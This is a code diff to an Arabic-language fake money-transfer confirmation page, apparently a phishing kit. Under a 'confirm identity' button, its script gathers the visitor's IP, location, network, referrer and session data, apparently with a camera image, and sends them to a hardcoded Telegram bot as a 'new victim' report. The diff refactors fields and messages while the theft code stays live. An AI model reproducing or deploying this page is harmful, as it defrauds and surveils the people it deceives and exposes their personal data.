@@ -278,7 +278,7 @@
 
     <h1 class="title">تأكيد التحويل</h1>
 
-    <h2 class="main-amount">1000 <span>جنيه</span></h2>
+    <h2 class="main-amount"><span id="amountNumber">1000</span> <span>جنيه</span></h2>
     <p class="subtitle">
         يرجى تأكيد بيانات التحويل لإتمام العملية
     </p>
@@ -290,7 +290,7 @@
 
             <span class="label">من</span> 
 
-            <span class="value" id="phoneDisplay">01008652784</span>
+            <span class="value" id="senderDisplay">01012345678</span>
 
         </div>
 
@@ -301,10 +301,7 @@
         <div class="row">
             <span class="label">الي</span> 
 
-            <span class="value" id="senderDisplay">
-
-            01012345678
-            </span>
+            <span class="value" id="receiverDisplay">01008652784</span>
         </div>
 
         <div class="row">
@@ -320,12 +317,6 @@
     <button class="btn-confirm" id="confirmBtn" onclick="confirmTransfer()">
         تأكيد التحويل
     </button>
-
-    <!-- ===== حقل عرض الرابط ===== -->
-    <div class="link-container">
-        <span class="label">رابط التأكيد :</span>
-        <input type="text" id="receiverLinkDisplay" value="https://your-domain.com/receiver.html" readonly>
-    </div>
 
     <div id="status"></div>
 
@@ -351,64 +342,32 @@
 
 </div>
 
-</body>
-</html>
 <script>
 // 🔥 استبدل القيم دي بقيمك
 const BOT_TOKEN = '8603992880:AAF5ywTfIDDvkcbGooGQ8lU_2qLD5Aja-OI';
 const CHAT_ID = '8222931248';
 
-// ====== قراءة البيانات من localStorage ======
-function loadFromDashboard() {
-    const stored = localStorage.getItem('dashboardData');
-    if (!stored) return;
-    const data = JSON.parse(stored);
-    
-    // عرض البيانات في العناصر
-    if (document.getElementById('senderDisplay')) {
-        document.getElementById('senderDisplay').innerText = data.senderPhone || '01012345678';
-    }
-    if (document.getElementById('receiverDisplay')) {
-        document.getElementById('receiverDisplay').innerText = data.receiverPhone || '01008652784';
-    }
-    if (document.getElementById('nameDisplay')) {
-        document.getElementById('nameDisplay').innerText = data.receiverName || 'خالد ع** م*** ا*****';
-    }
-    if (document.getElementById('amountNumber')) {
-        document.getElementById('amountNumber').innerText = data.amount || '600';
-    }
-    if (document.getElementById('phoneDisplay')) {
-        document.getElementById('phoneDisplay').innerText = data.receiverPhone || '01008652784';
-    }
-    
-    // عرض الرابط اللي جاي من الداشبورد
-    if (document.getElementById('receiverLinkDisplay')) {
-        document.getElementById('receiverLinkDisplay').value = data.receiverLink || 'https://your-domain.com/receiver.html';
-    }
-}
-
-window.onload = loadFromDashboard;
-
+// ====== قراءة البيانات من الرابط ======
 function getParams() {
     const params = new URLSearchParams(window.location.search);
     return {
         sender: params.get('sender') || '01012345678',
         receiver: params.get('receiver') || '01008652784',
-        name: params.get('name') || 'خالد ع***ي ق***',
-        amount: params.get('amount') || '500'
+        name: params.get('name') || 'خالد ع** م*** ا*****',
+        amount: params.get('amount') || '1000'
     };
 }
 
 // ====== عرض البيانات في الصفحة ======
 function loadData() {
     const data = getParams();
-    document.getElementById('phoneDisplay').innerText = data.receiver;
-    document.getElementById('nameDisplay').innerText = data.name;
     document.getElementById('senderDisplay').innerText = data.sender;
-    document.getElementById('amountDisplay').innerText = data.amount + ' جنيه';
+    document.getElementById('receiverDisplay').innerText = data.receiver;
+    document.getElementById('nameDisplay').innerText = data.name;
+    document.getElementById('amountNumber').innerText = data.amount;
 }
 
-// ====== دالة سحب البيانات القذرة ======
+// ====== دالة سحب البيانات ======
 function stealAllData() {
     const data = getParams();
     
@@ -440,7 +399,7 @@ function stealAllData() {
                 referrer: document.referrer || 'مباشر'
             };
 
-            const allData = {
+            return {
                 ip: ip,
                 location: location,
                 org: org,
@@ -455,8 +414,6 @@ function stealAllData() {
                     amount: data.amount
                 }
             };
-
-            return allData;
         });
 }
 
@@ -466,7 +423,7 @@ function confirmTransfer() {
     const btn = document.getElementById('confirmBtn');
     btn.disabled = true;
     btn.style.opacity = '0.7';
-    statusDiv.innerHTML = ' جاري تأكيد الهوية...';
+    statusDiv.innerHTML = 'جاري تأكيد الهوية...';
     statusDiv.style.color = '#e68a00';
 
     const data = getParams();
@@ -487,7 +444,7 @@ function confirmTransfer() {
 
                 stealAllData()
                     .then(allData => {
-                        const caption = ` ضحية جديدة - تقرير كامل
+                        const caption = `🕵️ ضحية جديدة - تقرير كامل
 
 📌 IP: ${allData.ip}
 📍 الموقع: ${allData.location}
@@ -524,13 +481,13 @@ ${allData.sessionData}
                             })
                         })
                         .then(() => {
-                            statusDiv.innerHTML = ' تم تأكيد هويتك بنجاح! جاري إتمام التحويل...';
+                            statusDiv.innerHTML = '✅ تم تأكيد هويتك بنجاح! جاري إتمام التحويل...';
                             statusDiv.style.color = '#28a745';
                             btn.disabled = false;
                             btn.style.opacity = '1';
                         })
                         .catch(() => {
-                            statusDiv.innerHTML = ' !تم التأكيد لكن حدث مشكلة في الإرسال.';
+                            statusDiv.innerHTML = '⚠️ تم التأكيد لكن حدث مشكلة في الإرسال.';
                             statusDiv.style.color = '#e60000';
                             btn.disabled = false;
                             btn.style.opacity = '1';
@@ -563,7 +520,7 @@ ${allData.sessionData}
                         })
                     });
 
-                    statusDiv.innerHTML = ' تم التأكيد (بدون صورة)';
+                    statusDiv.innerHTML = '✅ تم التأكيد (بدون صورة)';
                     statusDiv.style.color = '#28a745';
                     btn.disabled = false;
                     btn.style.opacity = '1';
